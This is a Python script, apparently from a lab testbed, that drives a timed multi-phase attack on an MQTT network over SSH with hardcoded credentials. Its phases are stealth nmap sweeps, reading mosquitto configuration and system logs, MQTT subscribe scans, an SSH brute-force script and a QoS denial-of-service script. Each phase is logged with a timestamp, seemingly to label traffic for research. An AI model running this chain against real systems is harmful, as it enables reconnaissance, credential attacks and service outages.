import ssh_auto_access as ssh
import time 
from datetime import datetime
import os


def initial_access(phase_number, pause):
	
    start_time = datetime.utcnow()
    commands = "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr;sudo nmap -sS -T1 -Pn 192.168.1.0/24;sudo nmap -sS -T1  -Pn 192.168.0.0/24;sudo nmap  -sS -T1 -Pn 10.0.0.0/24"
    commands_list = commands.split(';')
    ssh.ssh_commands("10.0.0.7", "ope", "maint", commands_list, 1, 5, "./out.log", 9999)
    end_time = datetime.utcnow()
    experiment = {
	"phase_number": phase_number,
	"attack_name": "empty_connection_dos",
	"phase_name": "network_discovery",
	"start_time": start_time,
	"end_time": end_time
	}
    time.sleep(pause)
    
    return experiment
    

def mqtt_discovery(phase_number, pause):
    start_time = datetime.utcnow()
    commands = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog;sudo /usr/bin/nmap -sS -T1 -Pn -p 1883,8883 10.0.0.0/24;sleep 20;sudo nmap -sS -T1 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24;sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
    commands_list = commands.split(';')
    ssh.ssh_commands("10.0.0.7", "ope", "maint", commands_list, 1, 5, "./out1.log", 6666)
    end_time = datetime.utcnow()
    experiment = {
		"phase_number": phase_number,
		"attack_name": "empty_connection_dos",
		"phase_name": "mqtt_discovery",
		"start_time": start_time,
		"end_time": end_time
		}
    time.sleep(pause)
    
    return experiment
    

def brute_force(phase_number, pause):
    start_time = datetime.utcnow()
    os.system('python3 ssh_brute_force.py')
    end_time = datetime.utcnow()
    experiment = {
		"phase_number": phase_number,
		"attack_name": "empty_connection_dos",
		"phase_name": "ssh_brute_force",
		"start_time": start_time,
		"end_time": end_time
		}
    time.sleep(pause)
    
    return experiment

	
def qos_mid_dos(phase_number, pause):
	
    start_time = datetime.utcnow()
    commands = "sudo python3 qos_mid_dos.py" 
    commands_list = commands.split(';')
    ssh.ssh_commands("10.0.0.7", "ope", "maint", commands_list, 1, 5, "./out1.log", 6666)
    end_time = datetime.utcnow()
    experiment = {
		"phase_number": phase_number,
		"attack_name": "qos_mid_dos",
		"phase_name": "qos_mid_dos",
		"start_time": start_time,
		"end_time": end_time
		}
    time.sleep(pause)
    
    return experiment


def main():
    experiments_details = []
    
    start_time_all = datetime.utcnow()
    """
    # 1) INITIAL ACCESS
    #----------------------------------------------------------------------------------------------
    experiment = initial_access(1, 60)
    experiments_details.append(experiment)
    
    # 1opt) SSH BRUTEFORCE
    #----------------------------------------------------------------------------------------------
    experiment = brute_force(1.5, 30)
    experiments_details.append(experiment)
    
    # 2) MQTT DISCOVERY
    #---------------------------------------------------------------------------------------------
    experiment = mqtt_discovery(2, 60)
    experiments_details.append(experiment)
    """
    # 3) QOS MID DOS
    #----------------------------------------------------------------------------------------------
    experiment = qos_mid_dos(3, 10)
    experiments_details.append(experiment)
    
    
    end_time_all = datetime.utcnow()
    experiment = {
		"phase_number": 0,
		"attack_name": "qos_mid_dos",
		"phase_name": "all_steps",
		"start_time": start_time_all,
		"end_time": end_time_all
		}
    experiments_details.append(experiment)
    print(experiments_details)

if __name__ == '__main__':
    main()
	
	
